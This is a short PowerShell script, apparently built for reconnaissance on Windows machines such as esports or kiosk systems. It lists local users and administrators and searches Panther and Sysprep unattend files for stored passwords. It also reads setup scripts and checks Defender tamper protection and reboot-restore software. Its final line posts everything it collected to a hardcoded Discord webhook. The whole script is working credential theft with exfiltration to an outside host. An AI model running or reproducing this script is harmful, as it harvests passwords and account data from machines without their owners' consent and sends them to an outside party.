$w='https://discord.com/api/webhooks/1561224763613913118/21BA2nT9ZxGDSGoO70TNzj6vw0wr7cVWtcllE5TMdlDfIrS9DVzQ1p74VLtujA518E02'
$f=$env:TEMP+'\r.txt'
net user>$f
net localgroup Administrators>>$f
net user ESportsAdmin>>$f 2>&1
sls "$env:windir\Panther\*.xml","$env:windir\System32\Sysprep\*.xml" -Pattern 'assword'>>$f
gc "$env:windir\Setup\Scripts\*">>$f
Get-MpComputerStatus|fl AMRunningMode,IsTamperProtected>>$f
gsv DFServ,SRService,RebootRestore,CleanSlate* -EA 0>>$f
curl.exe -s -F ('file=@'+$f) $w